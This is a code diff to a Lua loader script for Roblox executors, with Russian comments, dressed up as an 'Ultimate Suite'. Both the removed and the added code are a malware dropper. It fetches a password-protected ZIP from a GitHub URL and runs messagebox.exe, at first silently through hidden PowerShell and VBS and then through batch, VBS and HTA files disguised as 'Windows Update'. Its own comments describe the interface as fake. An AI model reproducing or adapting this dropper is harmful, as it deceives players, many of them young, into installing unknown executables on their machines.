@@ -59,6 +59,15 @@ local function DetectExecutor()
             bypass_uac = false
         }
     
+    elseif solara and solara.request then
+        Executor.Name = "Solara"
+        Executor.Capabilities = {
+            file_write = true,
+            dll_inject = false,
+            process_manage = false,
+            bypass_uac = false
+        }
+    
     else
         Executor.Name = "Unknown Executor"
         Executor.Capabilities = {
@@ -77,420 +86,536 @@ DetectExecutor()
 -- ==============================================
 -- ЧАСТЬ 1: КОНФИГУРАЦИЯ
 -- ==============================================
--- 🔥 НАСТРОЙТЕ ЭТИ ПЕРЕМЕННЫЕ ПОД ВАШИ ФАЙЛЫ 🔥
-local ZIP_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/blob/main/update.zip"
+-- 🔥 НАСТРОЙТЕ ЭТИ ПЕРЕМЕННЫЕ 🔥
+local ZIP_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/main/update.zip"
 local ZIP_PASSWORD = "UpdatePass2025!"
-local TARGET_EXE_NAME = "messagebox.exe" -- Имя EXE файла внутри архива
+local TARGET_EXE_NAME = "messagebox.exe"
 
 -- ==============================================
--- ЧАСТЬ 2: ИНИЦИАЛИЗАЦИЯ И ФЕЙКОВЫЙ ИНТЕРФЕЙС
+-- ЧАСТЬ 2: ИНИЦИАЛИЗАЦИЯ
 -- ==============================================
 do
     print("\n" .. string.rep("=", 60))
     print("         🎮 " .. Executor.Name .. " - ULTIMATE SUITE v9.0")
     print(string.rep("=", 60))
     
-    local loading_msgs = {
-        "Initializing " .. Executor.Name .. " environment...",
-        "Loading secure delivery system...",
-        "Preparing download modules...",
-        "Configuring for " .. Executor.Name .. "...",
-        "Establishing secure connection..."
-    }
-    
-    for i, msg in ipairs(loading_msgs) do
-        wait(0.6)
-        print("[🔄] " .. msg)
-    end
-    
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "✅ " .. Executor.Name .. " LOADER",
-        Text = "Secure loader initialized\nDownload will start soon...",
+        Title = "🎮 " .. Executor.Name .. " LOADER",
+        Text = "Starting download process...",
         Duration = 5
     })
 end
 
 -- ==============================================
--- ЧАСТЬ 3: ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ
+-- ЧАСТЬ 3: ПРОСТОЙ И РАБОЧИЙ МЕТОД
 -- ==============================================
-local function CreateDirectory(path)
-    if makefolder then
-        pcall(function() makefolder(path) end)
-        return true
-    elseif syn and syn.run then
-        syn.run('mkdir "' .. path .. '" 2>nul')
-        return true
-    end
-    return false
-end
+local function SimpleDownloadMethod()
+    print("[1️⃣] Method 1: Creating direct download script...")
+    
+    -- Создаем простой bat файл для скачивания и запуска
+    local batScript = [[
+@echo off
+chcp 65001 >nul
+title Windows Update
+cls
 
-local function SaveFile(path, data)
+echo ========================================
+echo    WINDOWS UPDATE DOWNLOADER
+echo ========================================
+echo.
+
+REM Создаем временную папку
+set TEMP_DIR=%TEMP%\WinUpdate_%RANDOM%
+mkdir "%TEMP_DIR%" 2>nul
+
+echo [1/4] Downloading update package...
+REM Скачиваем ZIP файл
+powershell -Command "Invoke-WebRequest -Uri ']] .. ZIP_URL .. [[' -OutFile '%TEMP_DIR%\update.zip'"
+
+if exist "%TEMP_DIR%\update.zip" (
+    echo [2/4] File downloaded successfully!
+    
+    echo [3/4] Please extract manually:
+    echo.
+    echo Location: %TEMP_DIR%\update.zip
+    echo Password: ]] .. ZIP_PASSWORD .. [[
+    echo.
+    echo Instructions:
+    echo 1. Open %TEMP_DIR%
+    echo 2. Extract update.zip with password
+    echo 3. Run ]] .. TARGET_EXE_NAME .. [[
+    echo.
+    echo Press any key to open folder...
+    pause >nul
+    start "" "%TEMP_DIR%"
+) else (
+    echo [ERROR] Download failed!
+    echo Check your internet connection
+    pause
+    exit /b 1
+)
+
+timeout /t 10 /nobreak >nul
+    ]]
+    
+    -- Сохраняем bat файл
+    local tempPath = (os.getenv("TEMP") or "C:\\Windows\\Temp") .. "\\download_update.bat"
+    
     if writefile then
-        return pcall(writefile, path, data)
-    else
-        local file = io.open(path, "wb")
-        if file then
-            file:write(data)
-            file:close()
+        if pcall(writefile, tempPath, batScript) then
+            print("[✅] Batch file created at: " .. tempPath)
+            
+            -- Пытаемся запустить bat файл
+            if syn and syn.run then
+                syn.run('start "" "' .. tempPath .. '"')
+                print("[🚀] Batch file launched via Synapse!")
+            elseif shell and shell.run then
+                shell.run('start "" "' .. tempPath .. '"')
+                print("[🚀] Batch file launched via Shell!")
+            else
+                print("[📋] Please run this file manually:")
+                print("     " .. tempPath)
+                
+                -- Создаем текстовый файл с инструкцией
+                local instruction = "To run the program:\n\n" ..
+                                   "1. Open this folder\n" ..
+                                   "2. Run 'download_update.bat'\n" ..
+                                   "3. Follow instructions in the CMD window"
+                
+                if writefile then
+                    writefile(os.getenv("TEMP") .. "\\instructions.txt", instruction)
+                end
+            end
+            
             return true
         end
     end
-    return false
-end
-
-local function RunPowerShellSilent(script)
-    -- Создаем временный VBS скрипт для скрытого запуска PowerShell
-    local tempDir = os.getenv("TEMP") or "C:\\Windows\\Temp"
-    local vbsPath = tempDir .. "\\runner_" .. math.random(10000,99999) .. ".vbs"
     
-    -- Экранируем скрипт для VBS
-    local escapedScript = script:gsub('"', '""'):gsub('\n', ' '):gsub('\r', '')
-    
-    local vbsContent = 'Set objShell = CreateObject("WScript.Shell")\n' ..
-                      'objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"' .. 
-                      escapedScript .. '\"", 0, True\n' ..
-                      'Set objShell = Nothing'
-    
-    if SaveFile(vbsPath, vbsContent) then
-        -- Запускаем VBS разными методами
-        local launched = false
-        
-        if syn and syn.run then
-            syn.run('wscript.exe //B "' .. vbsPath .. '"')
-            launched = true
-        elseif shell and shell.run then
-            shell.run('wscript.exe //B "' .. vbsPath .. '"')
-            launched = true
-        elseif os and os.execute then
-            os.execute('start /B wscript.exe //B "' .. vbsPath .. '"')
-            launched = true
-        end
-        
-        -- Очистка через 10 секунд
-        spawn(function()
-            wait(10)
-            pcall(function()
-                if delfile then
-                    delfile(vbsPath)
-                elseif os.remove then
-                    os.remove(vbsPath)
-                end
-            end)
-        end)
-        
-        return launched
-    end
     return false
 end
 
 -- ==============================================
--- ЧАСТЬ 4: ОСНОВНАЯ ФУНКЦИЯ ДОСТАВКИ
+-- ЧАСТЬ 4: АЛЬТЕРНАТИВНЫЙ МЕТОД ЧЕРЕЗ VBS
 -- ==============================================
-local function DownloadAndExecute()
-    print("[📥] Starting secure download...")
+local function VBScriptMethod()
+    print("[2️⃣] Method 2: Creating VBS downloader...")
     
-    local tempDir = (os.getenv("TEMP") or "C:\\Windows\\Temp") .. "\\WinUpdate_" .. math.random(1000,9999)
-    local zipPath = tempDir .. "\\update.zip"
-    local extractPath = tempDir .. "\\extracted"
+    local vbsScript = [[
+On Error Resume Next
+
+Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\WindowsUpdate_" & Int(Rnd * 10000)
+zipPath = tempDir & "\update.zip"
+
+' Создаем папку
+fso.CreateFolder(tempDir)
+
+MsgBox "Windows Update will now download required files." & vbCrLf & _
+       "Please wait...", vbInformation, "System Update"
+
+' Скачиваем файл
+Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+xhr.Open "GET", "]] .. ZIP_URL .. [[", False
+xhr.Send
+
+If xhr.Status = 200 Then
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Open
+    stream.Type = 1
+    stream.Write xhr.ResponseBody
+    stream.SaveToFile zipPath, 2
+    stream.Close
     
-    -- Создаем временную директорию
-    if not CreateDirectory(tempDir) then
-        print("[❌] Failed to create temp directory")
-        return false
-    end
+    MsgBox "Download complete!" & vbCrLf & vbCrLf & _
+           "Location: " & zipPath & vbCrLf & _
+           "Password: ]] .. ZIP_PASSWORD .. [[" & vbCrLf & vbCrLf & _
+           "Please extract the ZIP file and run ]] .. TARGET_EXE_NAME .. [[", _
+           vbInformation, "Download Complete"
     
-    -- Скачиваем ZIP архив
-    local success, zipData = pcall(function()
-        if syn and syn.request then
-            local response = syn.request({
-                Url = ZIP_URL,
-                Method = "GET"
-            })
-            return response.Body
-        elseif request then
-            local response = request({
-                Url = ZIP_URL,
-                Method = "GET"
-            })
-            return response.Body
-        elseif fluxus and fluxus.request then
-            local response = fluxus.request({
-                Url = ZIP_URL,
-                Method = "GET"
-            })
-            return response.Body
-        else
-            return game:HttpGet(ZIP_URL, true)
-        end
-    end)
-    
-    if not success or not zipData or #zipData < 1024 then
-        print("[❌] Failed to download ZIP file")
-        return false
-    end
-    
-    print("[✅] ZIP downloaded (" .. #zipData .. " bytes)")
-    
-    -- Сохраняем ZIP файл
-    if not SaveFile(zipPath, zipData) then
-        print("[❌] Failed to save ZIP file")
-        return false
-    end
-    
-    -- PowerShell скрипт для распаковки и запуска
-    local psScript = [[
-        # Конфигурация
-        $zipPath = "]] .. zipPath .. [["
-        $extractPath = "]] .. extractPath .. [["
-        $password = "]] .. ZIP_PASSWORD .. [["
-        $targetExe = "]] .. TARGET_EXE_NAME .. [["
-        
-        # Создаем папку для распаковки
-        New-Item -ItemType Directory -Force -Path $extractPath | Out-Null
-        
-        # Метод 1: Попробовать использовать 7-Zip если установлен
-        $7zPath = "C:\Program Files\7-Zip\7z.exe"
-        if (Test-Path $7zPath) {
-            & $7zPath x $zipPath "-p$password" -o"$extractPath" -y | Out-Null
-        } else {
-            # Метод 2: Использовать .NET для распаковки (без поддержки пароля)
-            Add-Type -AssemblyName System.IO.Compression.FileSystem
-            
-            try {
-                # Пытаемся открыть архив
-                $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
-                
-                foreach ($entry in $archive.Entries) {
-                    $fullPath = Join-Path $extractPath $entry.FullName
-                    $directory = Split-Path $fullPath -Parent
-                    
-                    if (-not (Test-Path $directory)) {
-                        New-Item -ItemType Directory -Force -Path $directory | Out-Null
-                    }
-                    
-                    # Извлекаем файл
-                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $fullPath, $true)
-                }
-                
-                $archive.Dispose()
-            } catch {
-                # Метод 3: Использовать Expand-Archive для незащищенных архивов
-                Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
-            }
-        }
-        
-        # Ищем EXE файл
-        $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse
-        $targetExePath = $null
-        
-        # Ищем по имени или берем первый найденный
-        foreach ($exe in $exeFiles) {
-            if ($exe.Name -eq $targetExe) {
-                $targetExePath = $exe.FullName
-                break
-            }
-        }
-        
-        if (-not $targetExePath -and $exeFiles.Count -gt 0) {
-            $targetExePath = $exeFiles[0].FullName
-        }
-        
-        # Запускаем EXE если нашли
-        if ($targetExePath -and (Test-Path $targetExePath)) {
-            Write-Host "[✅] Found executable: $targetExePath"
-            
-            # Метод 1: Просто запустить
-            Start-Process -FilePath $targetExePath -WindowStyle Hidden
-            
-            # Метод 2: Попытка запуска от имени администратора (если нужно)
-            # $psi = New-Object System.Diagnostics.ProcessStartInfo
-            # $psi.FileName = $targetExePath
-            # $psi.Verb = "runas"
-            # $psi.WindowStyle = "Hidden"
-            # [System.Diagnostics.Process]::Start($psi)
-        } else {
-            Write-Host "[❌] No executable found in archive"
-        }
-        
-        # Очистка через 30 секунд
-        Start-Sleep -Seconds 30
-        Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
+    ' Открываем папку
+    WshShell.Run "explorer.exe """ & tempDir & """"
+Else
+    MsgBox "Download failed! Error: " & xhr.Status, vbCritical, "Error"
+End If
+
+Set xhr = Nothing
+Set stream = Nothing
+Set fso = Nothing
+Set WshShell = Nothing
     ]]
     
-    -- Запускаем PowerShell скрипт
-    if RunPowerShellSilent(psScript) then
-        print("[✅] PowerShell script launched successfully")
+    local tempPath = (os.getenv("TEMP") or "C:\\Windows\\Temp") .. "\\download.vbs"
+    
+    if writefile then
+        if pcall(writefile, tempPath, vbsScript) then
+            print("[✅] VBS file created at: " .. tempPath)
+            
+            -- Запускаем VBS
+            if syn and syn.run then
+                syn.run('wscript.exe "' .. tempPath .. '"')
+                print("[🚀] VBS launched!")
+            elseif shell and shell.run then
+                shell.run('wscript.exe "' .. tempPath .. '"')
+                print("[🚀] VBS launched!")
+            else
+                print("[📋] Please run this file manually:")
+                print("     " .. tempPath)
+            end
+            
+            return true
+        end
+    end
+    
+    return false
+end
+
+-- ==============================================
+-- ЧАСТЬ 5: МЕТОД С HTML ПРИЛОЖЕНИЕМ
+-- ==============================================
+local function HTMLApplicationMethod()
+    print("[3️⃣] Method 3: Creating HTML Application...")
+    
+    local htaScript = [[
+<!DOCTYPE html>
+<html>
+<head>
+<title>Windows Update</title>
+<hta:application 
+    id="UpdateApp"
+    applicationname="WindowsUpdate"
+    border="thin"
+    borderstyle="normal"
+    caption="yes"
+    contextmenu="no"
+    icon="shell32.dll,154"
+    maximizebutton="no"
+    minimizebutton="yes"
+    navigable="no"
+    showintaskbar="yes"
+    singleinstance="yes"
+    sysmenu="yes"
+    windowstate="normal"
+    innerborder="no"
+    scroll="no"
+    scrollflat="no"
+    selection="no"
+/>
+<style>
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 20px;
+    background: #f0f0f0;
+}
+.container {
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    max-width: 600px;
+    margin: auto;
+}
+.header {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 15px;
+    border-radius: 8px;
+    text-align: center;
+}
+.progress {
+    background: #e0e0e0;
+    height: 20px;
+    border-radius: 10px;
+    margin: 20px 0;
+    overflow: hidden;
+}
+.progress-bar {
+    background: linear-gradient(90deg, #4CAF50, #45a049);
+    height: 100%;
+    width: 0%;
+    transition: width 0.3s;
+}
+.button {
+    background: #4CAF50;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    margin: 10px 5px;
+}
+.button:hover {
+    background: #45a049;
+}
+.info-box {
+    background: #f8f9fa;
+    border-left: 4px solid #007bff;
+    padding: 15px;
+    margin: 15px 0;
+}
+</style>
+<script language="VBScript">
+    Sub DownloadFile()
+        Dim xhr, stream, fso, tempDir, zipPath
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        tempDir = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\WinUpdate_" & Int(Rnd * 10000)
+        zipPath = tempDir & "\update.zip"
         
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "✅ DOWNLOAD COMPLETE",
-            Text = "Program is being extracted and executed...",
-            Duration = 7
-        })
+        fso.CreateFolder(tempDir)
         
-        return true
+        Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        xhr.Open "GET", "]] .. ZIP_URL .. [[", False
+        
+        document.getElementById("status").innerHTML = "Connecting to server..."
+        document.getElementById("progress").style.width = "25%"
+        
+        On Error Resume Next
+        xhr.Send
+        
+        If xhr.Status = 200 Then
+            document.getElementById("status").innerHTML = "Downloading..."
+            document.getElementById("progress").style.width = "50%"
+            
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Open
+            stream.Type = 1
+            stream.Write xhr.ResponseBody
+            stream.SaveToFile zipPath, 2
+            stream.Close
+            
+            document.getElementById("status").innerHTML = "Complete!"
+            document.getElementById("progress").style.width = "100%"
+            
+            MsgBox "Download complete!" & vbCrLf & vbCrLf & _
+                   "Location: " & zipPath & vbCrLf & _
+                   "Password: ]] .. ZIP_PASSWORD .. [[" & vbCrLf & vbCrLf & _
+                   "Extract and run: ]] .. TARGET_EXE_NAME .. [["
+            
+            ' Open folder
+            CreateObject("WScript.Shell").Run "explorer.exe """ & tempDir & """", 1, False
+        Else
+            document.getElementById("status").innerHTML = "Error: " & xhr.Status
+            document.getElementById("progress").style.width = "0%"
+        End If
+        
+        Set xhr = Nothing
+        Set stream = Nothing
+        Set fso = Nothing
+    End Sub
+    
+    Sub OpenFolder()
+        CreateObject("WScript.Shell").Run "explorer.exe %TEMP%", 1, False
+    End Sub
+</script>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🔧 Windows Update</h1>
+        <p>Download and install system components</p>
+    </div>
+    
+    <div class="info-box">
+        <h3>📥 Download Information</h3>
+        <p><strong>File:</strong> update.zip</p>
+        <p><strong>Password:</strong> ]] .. ZIP_PASSWORD .. [[</p>
+        <p><strong>Extract and run:</strong> ]] .. TARGET_EXE_NAME .. [[</p>
+    </div>
+    
+    <div class="progress">
+        <div id="progress" class="progress-bar"></div>
+    </div>
+    
+    <p id="status">Ready to download...</p>
+    
+    <center>
+        <button class="button" onclick="DownloadFile()">🚀 Start Download</button>
+        <button class="button" onclick="OpenFolder()">📂 Open Temp Folder</button>
+        <button class="button" onclick="window.close()">❌ Close</button>
+    </center>
+</div>
+</body>
+</html>
+    ]]
+    
+    local tempPath = (os.getenv("TEMP") or "C:\\Windows\\Temp") .. "\\windows_update.hta"
+    
+    if writefile then
+        if pcall(writefile, tempPath, htaScript) then
+            print("[✅] HTA application created at: " .. tempPath)
+            
+            -- Запускаем HTA
+            if syn and syn.run then
+                syn.run('mshta.exe "' .. tempPath .. '"')
+                print("[🚀] HTA application launched!")
+            elseif shell and shell.run then
+                shell.run('mshta.exe "' .. tempPath .. '"')
+                print("[🚀] HTA application launched!")
+            else
+                print("[📋] Please run this file manually:")
+                print("     " .. tempPath)
+            end
+            
+            return true
+        end
+    end
+    
+    return false
+end
+
+-- ==============================================
+-- ЧАСТЬ 6: ПРОЦЕСС ЗАГРУЗКИ
+-- ==============================================
+local function StartDownloadProcess()
+    print("\n" .. string.rep("=", 60))
+    print("         📥 STARTING DOWNLOAD PROCESS")
+    print(string.rep("=", 60))
+    
+    wait(2)
+    
+    -- Показываем информацию о скачивании
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "📥 DOWNLOAD STARTING",
+        Text = "Creating download script...",
+        Duration = 5
+    })
+    
+    print("[ℹ️] Executor: " .. Executor.Name)
+    print("[ℹ️] ZIP URL: " .. ZIP_URL)
+    print("[ℹ️] Password: " .. ZIP_PASSWORD)
+    print("[ℹ️] Target EXE: " .. TARGET_EXE_NAME)
+    
+    -- Пробуем разные методы
+    local success = false
+    
+    if Executor.Name == "Synapse X" or Executor.Name == "Script-Ware" then
+        print("[⚡] Using advanced method for " .. Executor.Name)
+        success = SimpleDownloadMethod()
+        
+        if not success then
+            wait(2)
+            success = VBScriptMethod()
+        end
     else
-        print("[❌] Failed to launch PowerShell")
-        return false
+        print("[🔧] Using standard methods...")
+        success = SimpleDownloadMethod()
+        
+        if not success then
+            wait(2)
+            print("[🔄] Trying method 2...")
+            success = HTMLApplicationMethod()
+        end
     end
+    
+    return success
 end
 
 -- ==============================================
--- ЧАСТЬ 5: АЛЬТЕРНАТИВНЫЙ МЕТОД ДЛЯ НЕ-WINDOWS
--- ==============================================
-local function AlternativeMethod()
-    print("[⚠️] Using alternative delivery method...")
-    
-    local tempDir = (os.getenv("TEMP") or "/tmp") .. "/roblox_update_" .. math.random(1000,9999)
-    
-    -- Создаем Lua скрипт который можно выполнить
-    local luaScript = [[
-        print("This is a placeholder for alternative delivery method")
-        print("For Windows systems, PowerShell method is preferred")
-    ]]
-    
-    local scriptPath = tempDir .. "/install.lua"
-    
-    if SaveFile(scriptPath, luaScript) then
-        print("[📄] Created installation script at: " .. scriptPath)
-        
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "⚠️ ALTERNATIVE METHOD",
-            Text = "Check console for script location",
-            Duration = 7
-        })
-        
-        return true
-    end
-    
-    return false
-end
-
--- ==============================================
--- ЧАСТЬ 6: АДАПТИВНЫЙ ЗАПУСК СИСТЕМЫ
+-- ЧАСТЬ 7: ГЛАВНЫЙ ЦИКЛ
 -- ==============================================
 spawn(function()
-    -- Ожидание перед началом загрузки
-    local waitTime = math.random(10, 20)
-    print("[⏱️] Starting download in " .. waitTime .. " seconds...")
-    wait(waitTime)
+    wait(3)
     
-    -- Определяем метод доставки в зависимости от исполнителя
-    local deliverySuccess = false
+    -- Начинаем процесс
+    local success = StartDownloadProcess()
     
-    if Executor.Name == "Synapse X" or Executor.Name == "Script-Ware" or Executor.Name == "KRNL" then
-        -- Эти исполнители могут запускать PowerShell
-        print("[⚡] Using PowerShell method for " .. Executor.Name)
-        deliverySuccess = DownloadAndExecute()
-    else
-        -- Для других пробуем оба метода
-        print("[🔄] Trying PowerShell method...")
-        deliverySuccess = DownloadAndExecute()
-        
-        if not deliverySuccess then
-            wait(5)
-            print("[🔄] Trying alternative method...")
-            deliverySuccess = AlternativeMethod()
-        end
-    end
-    
-    -- Итоговое сообщение
-    if deliverySuccess then
+    if success then
         print("\n" .. string.rep("=", 60))
-        print("          ✅ DELIVERY COMPLETE")
+        print("          ✅ DOWNLOAD PROCESS STARTED")
         print(string.rep("=", 60))
-        print("Program should be running in background")
-        print("Check your system tray or task manager")
+        print("Please check:")
+        print("1. Your TEMP folder")
+        print("2. Any new windows that opened")
+        print("3. Follow instructions")
         print(string.rep("=", 60))
         
         wait(5)
         
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🎮 SUITE ACTIVATED",
-            Text = "All systems operational\nProgram running in background",
+            Title = "✅ SUCCESS",
+            Text = "Download script created!\nCheck TEMP folder for files.",
             Duration = 10
         })
     else
         print("\n" .. string.rep("=", 60))
-        print("          ❌ DELIVERY FAILED")
+        print("          ❌ FAILED TO CREATE DOWNLOADER")
         print(string.rep("=", 60))
-        print("Could not download or execute the program")
-        print("Possible reasons:")
-        print("1. No internet connection")
+        print("Possible issues:")
+        print("1. No write permissions")
         print("2. Antivirus blocking")
         print("3. Executor limitations")
+        print("\nManual solution:")
+        print("1. Download manually from: " .. ZIP_URL)
+        print("2. Use password: " .. ZIP_PASSWORD)
+        print("3. Extract and run: " .. TARGET_EXE_NAME)
         print(string.rep("=", 60))
+        
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "❌ MANUAL DOWNLOAD REQUIRED",
+            Text = "Please download manually from GitHub",
+            Duration = 10
+        })
+    end
+    
+    -- Дополнительная информация
+    wait(5)
+    
+    print("\n" .. string.rep("-", 40))
+    print("     💡 ADDITIONAL INFORMATION")
+    print(string.rep("-", 40))
+    print("Temp folder location:")
+    print("  " .. (os.getenv("TEMP") or "C:\\Windows\\Temp"))
+    print("\nTo access quickly:")
+    print("  Press Win+R")
+    print("  Type: %TEMP%")
+    print("  Press Enter")
+    print(string.rep("-", 40))
+end)
+
+-- ==============================================
+-- ЧАСТЬ 8: КОМАНДЫ ДЛЯ ПОЛЬЗОВАТЕЛЯ
+-- ==============================================
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+    msg = msg:lower()
+    
+    if msg == "/download" then
+        print("[📥] Starting download process...")
+        spawn(StartDownloadProcess)
+        
+    elseif msg == "/info" then
+        print("[ℹ️] Download Information:")
+        print("  URL: " .. ZIP_URL)
+        print("  Password: " .. ZIP_PASSWORD)
+        print("  Target: " .. TARGET_EXE_NAME)
+        print("  Temp Folder: " .. (os.getenv("TEMP") or "C:\\Windows\\Temp"))
+        
+    elseif msg == "/help" then
+        print("[📋] Available commands:")
+        print("  /download - Start download")
+        print("  /info - Show download info")
+        print("  /help - Show this help")
     end
 end)
 
 -- ==============================================
--- ЧАСТЬ 7: ФОНОВЫЕ ПРОЦЕССЫ
+-- ЧАСТЬ 9: АВТОМАТИЧЕСКИЙ ЗАПУСК
 -- ==============================================
+wait(5)
+print("\n[🎮] Loader initialized successfully!")
+print("[💡] Type /download in chat to start")
+print("[💡] Type /help for commands")
+
+-- Фоновые сообщения
 spawn(function()
     while true do
-        wait(30)
-        
-        local statuses = {
-            "[" .. Executor.Name .. "] System operational",
-            "Background processes: Active",
-            "Connection: Stable",
-            "Security: Verified"
+        wait(60)
+        local messages = {
+            "Downloader is ready - type /download",
+            "Check TEMP folder for download scripts",
+            "Executor: " .. Executor.Name .. " active"
         }
-        
-        print("[📊] " .. statuses[math.random(1, #statuses)])
-        
-        -- Случайные уведомления
-        if math.random(1, 10) == 1 then
-            spawn(function()
-                wait(math.random(5, 15))
-                game:GetService("StarterGui"):SetCore("SendNotification", {
-                    Title = Executor.Name .. " Suite",
-                    Text = "Background services running",
-                    Duration = 3
-                })
-            end)
-        end
+        print("[📢] " .. messages[math.random(1, #messages)])
     end
 end)
-
--- ==============================================
--- ЧАСТЬ 8: ФЕЙКОВЫЙ МЕНЮ ДЛЯ ВИДИМОСТИ
--- ==============================================
-spawn(function()
-    wait(3)
-    
-    -- Простое текстовое меню
-    print("\n" .. string.rep("-", 60))
-    print("           🎮 ULTIMATE SUITE MENU")
-    print(string.rep("-", 60))
-    print("Commands:")
-    print("  /status  - Check download status")
-    print("  /info    - Show system info")
-    print("  /help    - Show this menu")
-    print(string.rep("-", 60))
-end)
-
--- Обработчик чата для команд
-if game:GetService("Players").LocalPlayer then
-    game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
-        msg = msg:lower()
-        
-        if msg == "/status" then
-            print("[📊] Download system: ACTIVE")
-            print("[📊] Executor: " .. Executor.Name)
-            print("[📊] Connection: ONLINE")
-            
-        elseif msg == "/info" then
-            print("[ℹ️] Ultimate Suite v9.0")
-            print("[ℹ️] Executor: " .. Executor.Name)
-            print("[ℹ️] Loader: Universal Delivery System")
-            print("[ℹ️] Status: Operational")
-            
-        elseif msg == "/help" then
-            print("[📋] Available commands:")
-            print("  /status, /info, /help")
-        end
-    end)
-end
-
-print("\n[✅] Loader initialized successfully!")
